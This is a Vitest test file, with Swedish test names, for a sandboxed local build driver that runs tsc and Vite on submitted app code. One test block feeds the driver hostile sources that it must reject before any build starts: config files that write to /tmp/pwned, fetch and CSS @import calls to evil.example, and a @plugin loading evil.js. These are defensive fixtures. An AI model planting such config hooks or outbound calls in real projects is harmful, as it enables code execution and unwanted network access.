/**
 * Drivrutinen `local` på riktigt: tsc och Vite som barnprocesser mot mallens node_modules.
 * Långsammare än övriga tester (flera riktiga byggen). Kör för sig med
 *   npx vitest run packages/build/test/local.test.ts
 */
import * as childProcess from 'node:child_process';
import { mkdtemp, readdir, readFile, rm, stat } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import type { BuildResult, SourceFiles } from '@vibesandbox/contracts';
import { createBuildRunner, readTemplateKnowledge } from '../src/index.ts';
import { SYNTAX_ERROR_APP, TODO_APP, TYPE_ERROR_APP } from './apps.ts';

vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:child_process')>();
  return { ...actual, spawn: vi.fn(actual.spawn) };
});
const spawnSpy = vi.mocked(childProcess.spawn);

const templateDirectory = fileURLToPath(new URL('../../app-template/', import.meta.url));
const repoRoot = path.resolve(templateDirectory, '../..');
const BUILD_TIMEOUT = 120_000;

let tempDirectory: string;
let starterFiles: SourceFiles;
const results: BuildResult[] = [];

beforeAll(async () => {
  starterFiles = (await readTemplateKnowledge(templateDirectory)).starterFiles;
});

beforeEach(async () => {
  tempDirectory = await mkdtemp(path.join(tmpdir(), 'vibesandbox-lokalt-'));
  spawnSpy.mockClear();
});

afterEach(async () => {
  for (const result of results.splice(0)) await result.dispose();
  await rm(tempDirectory, { recursive: true, force: true });
});

function runner(limits: Record<string, number> = {}) {
  return createBuildRunner({ driver: 'local', templateDirectory, tempDirectory, limits });
}

async function build(files: SourceFiles, limits: Record<string, number> = {}, signal?: AbortSignal): Promise<BuildResult> {
  const result = await runner(limits).build(files, signal === undefined ? {} : { signal });
  results.push(result);
  return result;
}

describe('local: ett grönt bygge', () => {
  let result: BuildResult;

  beforeAll(async () => {
    const started = performance.now();
    result = await createBuildRunner({ driver: 'local', templateDirectory }).build(starterFiles);
    const cold = performance.now() - started;
    const again = performance.now();
    const warm = await createBuildRunner({ driver: 'local', templateDirectory }).build(starterFiles);
    console.info(`[build/local] startappen: ${(cold / 1000).toFixed(2)} s första gången, ${((performance.now() - again) / 1000).toFixed(2)} s andra`);
    await warm.dispose();
  }, BUILD_TIMEOUT);

  afterAll(async () => {
    await result.dispose();
  });

  it('startappen bygger grönt och ger en katalog med index.html och assets/', async () => {
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
    expect(result.durationMs).toBeGreaterThan(0);
    const directory = result.outputDirectory ?? '';
    expect(await readdir(directory)).toEqual(expect.arrayContaining(['index.html', 'assets']));
    expect(await readFile(path.join(directory, 'index.html'), 'utf8')).toMatch(/<script type="module"[^>]*src="\.\/assets\//);
  });

  it('dispose tar bort katalogen och går att anropa flera gånger', async () => {
    const extra = await createBuildRunner({ driver: 'local', templateDirectory }).build(starterFiles);
    const directory = extra.outputDirectory ?? '';
    await extra.dispose();
    await extra.dispose();
    await expect(stat(directory)).rejects.toMatchObject({ code: 'ENOENT' });
  }, BUILD_TIMEOUT);
});

describe('local: fel matas tillbaka som diagnoser', () => {
  it('typfel ⇒ typecheck-diagnos med fil och rad', async () => {
    const result = await build(TYPE_ERROR_APP);
    expect(result.ok).toBe(false);
    expect(result.outputDirectory).toBeUndefined();
    expect(result.diagnostics[0]).toMatchObject({ source: 'typecheck', file: 'src/App.tsx', line: 2 });
    expect(result.diagnostics[0]?.message).toMatch(/not assignable to type 'number'/);
  }, BUILD_TIMEOUT);

  it('syntaxfel ⇒ diagnos med fil och rad', async () => {
    const result = await build(SYNTAX_ERROR_APP);
    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({ file: 'src/App.tsx', line: 3 });
  }, BUILD_TIMEOUT);

  it('diagnoserna röjer inga av värdens absoluta sökvägar', async () => {
    const result = await build({ ...TYPE_ERROR_APP, 'src/lib/x.ts': "import { nope } from '../App.tsx';\nexport const y: string = nope;\n" });
    const text = JSON.stringify(result.diagnostics);
    expect(result.diagnostics.length).toBeGreaterThan(1);
    for (const secret of [tempDirectory, tmpdir(), repoRoot, process.env['HOME'] ?? '/home']) expect(text).not.toContain(secret);
  }, BUILD_TIMEOUT);

  it('arbetskatalogen städas alltid, även när bygget misslyckas', async () => {
    await build(TYPE_ERROR_APP);
    expect(await readdir(tempDirectory)).toEqual([]);
  }, BUILD_TIMEOUT);
});

describe('local: policybrott byggs aldrig och inga processer startas', () => {
  it.each<[string, SourceFiles]>([
    ['src/tsconfig.json (Vite/oxc läser närmaste tsconfig)', { 'src/tsconfig.json': '{"compilerOptions":{"jsxImportSource":"https://evil.example"}}' }],
    ['src/vite.config.ts', { 'src/vite.config.ts': "import fs from 'node:fs'; fs.writeFileSync('/tmp/pwned', 'x'); export default {};" }],
    ['src/main.tsx', { 'src/main.tsx': "fetch('https://evil.example');" }],
    ['src/.env', { 'src/.env': 'VITE_X=hemligt' }],
    ['src/postcss.config.js', { 'src/postcss.config.js': "require('fs').writeFileSync('/tmp/pwned', 'x');" }],
    ['CSS med @plugin', { 'src/styles.css': '@plugin "./evil.js";' }],
    ['CSS med @import url(https://…)', { 'src/styles.css': '@import url(https://evil.example/x.css);' }],
    ["import fs from 'node:fs'", { 'src/lib/fs.ts': "import fs from 'node:fs';\nexport const f = fs;\n" }],
    ["fetch('https://…')", { 'src/lib/net.ts': "export const f = () => fetch('https://evil.example/x');\n" }],
    ["window['fetch']", { 'src/lib/net.ts': "export const f = () => window['fetch']('/x');\n" }],
    ['jättelik källfil', { 'src/lib/stor.ts': `export const s = '${'a'.repeat(400_000)}';\n` }],
  ])('%s', async (_name, hostile) => {
    const result = await build({ ...starterFiles, ...hostile });
    expect(result.ok).toBe(false);
    expect(result.outputDirectory).toBeUndefined();
    expect(result.diagnostics.length).toBeGreaterThan(0);
    expect(result.diagnostics.every((d) => d.source === 'policy' && typeof d.rule === 'string')).toBe(true);
    expect(spawnSpy).not.toHaveBeenCalled();
    expect(await readdir(tempDirectory)).toEqual([]);
  });
});

describe('local: tak, tid, kö och avbrott', () => {
  it('jätteutdata stoppas av taket på utdatans storlek', async () => {
    const result = await build(starterFiles, { maxOutputBytes: 50_000 });
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.rule)).toContain('output-too-large');
    expect(await readdir(tempDirectory)).toEqual([]);
  }, BUILD_TIMEOUT);

  it('tidsgränsen avbryter bygget och ger en diagnos', async () => {
    const result = await build(starterFiles, { timeoutMs: 50 });
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.rule)).toContain('timeout');
    expect(await readdir(tempDirectory)).toEqual([]);
  }, BUILD_TIMEOUT);

  it('kön kör ett bygge åt gången: två samtidiga byggen blir båda gröna, i tur och ordning', async () => {
    const shared = runner();
    const both = await Promise.all([shared.build(starterFiles), shared.build(TODO_APP)]);
    results.push(...both);
    expect(both.map((r) => r.ok)).toEqual([true, true]);
    // Att det andra inte STARTAR förrän det första är klart visas i queue.test.ts.
    expect(spawnSpy.mock.calls.filter((call) => String(call[1]).includes('vite.js'))).toHaveLength(2);
  }, BUILD_TIMEOUT);

  it('avbrott mitt i bygget: avvisas med AbortError och allt städas', async () => {
    const controller = new AbortController();
    const run = runner().build(starterFiles, { signal: controller.signal });
    setTimeout(() => controller.abort(), 200);
    await expect(run).rejects.toMatchObject({ name: 'AbortError' });
    expect(await readdir(tempDirectory)).toEqual([]);
  }, BUILD_TIMEOUT);

  it('avbrott medan bygget väntar i kön: det startar aldrig', async () => {
    const shared = runner();
    const controller = new AbortController();
    const first = shared.build(starterFiles);
    const second = shared.build(TODO_APP, { signal: controller.signal });
    controller.abort();
    await expect(second).rejects.toMatchObject({ name: 'AbortError' });
    results.push(await first);
    expect(spawnSpy.mock.calls.filter((call) => String(call[1]).includes('vite.js'))).toHaveLength(1);
  }, BUILD_TIMEOUT);
});

describe('local: riktiga appar', () => {
  it('en realistisk todo-app som använder db.collection ur SDK:t bygger grönt', async () => {
    const result = await build(TODO_APP);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
    const assets = await readdir(path.join(result.outputDirectory ?? '', 'assets'));
    const js = await Promise.all(assets.filter((f) => f.endsWith('.js')).map((f) => readFile(path.join(result.outputDirectory ?? '', 'assets', f), 'utf8')));
    expect(js.join('')).toContain('/_api');
    expect(js.join('')).toContain('uppgifter');
  }, BUILD_TIMEOUT);
});

describe('local: bara för utveckling', () => {
  it('vägrar starta när NODE_ENV=production', () => {
    const previous = process.env['NODE_ENV'];
    process.env['NODE_ENV'] = 'production';
    try {
      expect(() => createBuildRunner({ driver: 'local', templateDirectory })).toThrow(/production/);
    } finally {
      process.env['NODE_ENV'] = previous;
    }
  });
});

describe('readTemplateKnowledge', () => {
  it('ger startfilerna och mallens exempel (App.tsx + styles.css)', async () => {
    const knowledge = await readTemplateKnowledge(templateDirectory);
    expect(Object.keys(knowledge.starterFiles).sort()).toEqual(['src/App.tsx', 'src/styles.css']);
    expect(Object.keys(knowledge.exampleFiles).sort()).toEqual(['src/App.tsx', 'src/styles.css']);
    expect(knowledge.exampleFiles['src/App.tsx']).toBe(await readFile(path.join(templateDirectory, 'src/App.tsx'), 'utf8'));
    expect(knowledge.starterFiles['src/App.tsx']).toMatch(/export function App/);
  });
});
